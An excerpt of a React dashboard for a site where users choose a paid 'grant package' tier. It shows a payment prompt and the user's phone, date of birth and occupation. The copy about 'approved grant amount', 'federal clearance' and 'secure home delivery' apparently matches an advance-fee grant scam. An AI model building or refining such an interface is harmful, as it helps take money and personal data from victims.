...
function Dashboard() {
  ...
  const paymentCtaRef = useRef<HTMLDivElement>(null);
  ...
  const [selectedPackageLoading, setSelectedPackageLoading] = useState<string | null>(null);
  ...
  useEffect(() => {
    const fetchData = async () => {
      try {
        ...
        else setError(dashResult.error || "Failed to load dashboard data");
        const pkgResult = await getGrantPackagesServerFn();
        if (pkgResult.success && pkgResult.packages) setPackages(pkgResult.packages);
      } catch {
  ...
  const handleSelectPackage = async (packageName: string) => {
    ...
    setSelectedPackageLoading(packageName);
    setError("");
    setSuccess("");
    try {
      const token = localStorage.getItem("token");
      ...
      const result = await selectPackageServerFn({ data: { token, packageName } });
      if (!result.success) {
      ...
      if (dashResult.success && dashResult.data) {
        ...
        setError(
          dashResult.error || "Package was saved, but the updated dashboard could not be loaded.",
        );
    } catch {
      setError("An error occurred while selecting the package");
    } finally {
      setSelectingPackage(false);
      setSelectedPackageLoading(null);
    }
  };
        ...
        <div className="max-w-7xl mx-auto space-y-6">
          ...
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <Card className="p-5 bg-white shadow-sm border border-slate-200">
              ...
              <p className="text-2xl sm:text-3xl font-extrabold text-emerald-700 mt-2">
                {dashboardData.grantAmount
                  ? `$${dashboardData.grantAmount.toLocaleString()}`
                  : "Pending"}
              </p>
              <p className="text-xs text-slate-500 mt-1">
                {dashboardData.selectedPackage
                  ? `${dashboardData.selectedPackage} Tier`
                  : "Select tier below"}
              </p>
            </Card>
            <Card className="p-5 bg-white shadow-sm border border-slate-200">
          ...
          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between pb-4 mb-6 border-b border-slate-200 gap-2">
              <div>
                ...
                <p className="text-xs sm:text-sm text-slate-600 mt-1">
                  Select your approved grant amount. Each tier includes federal clearance and
                  insured secure home delivery.
                </p>
              </div>
            </div>
                ...
                return (
                  ...
                  >
                    ...
                    <Button
                      ...
                      size="sm"
                      className={`w-full font-bold text-xs ${isSelected ? "bg-emerald-600 hover:bg-emerald-700 text-white cursor-default" : "bg-blue-900 hover:bg-blue-800 text-white"}`}
                    >
                      {isLoading ? (
            ...
            {dashboardData.selectedPackage && (
              <div
                ref={paymentCtaRef}
                className="mt-6 p-4 rounded-xl bg-blue-50 border border-blue-200 flex flex-col sm:flex-row items-center justify-between gap-4 scroll-mt-6"
              >
                <div className="text-center sm:text-left">
                  ...
                  <p className="text-xs text-blue-700">
                    Selected Package: <strong>{dashboardData.selectedPackage}</strong> ($
                    {dashboardData.grantAmount?.toLocaleString()})
                  </p>
                </div>
          ...
          <Card className="p-6 sm:p-8 bg-white shadow-md border border-slate-200">
            ...
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 text-sm">
              ...
              <div>
                ...
                <p className="font-semibold text-slate-900">{dashboardData.profile.phone}</p>
              </div>
              <div>
                <p className="text-xs font-semibold text-slate-500 uppercase">Date of Birth</p>
                <p className="font-semibold text-slate-900">{dashboardData.profile.dateOfBirth}</p>
              </div>
              <div>
                <p className="text-xs font-semibold text-slate-500 uppercase">Occupation</p>
                <p className="font-semibold text-slate-900">{dashboardData.profile.occupation}</p>
              </div>
              <div>
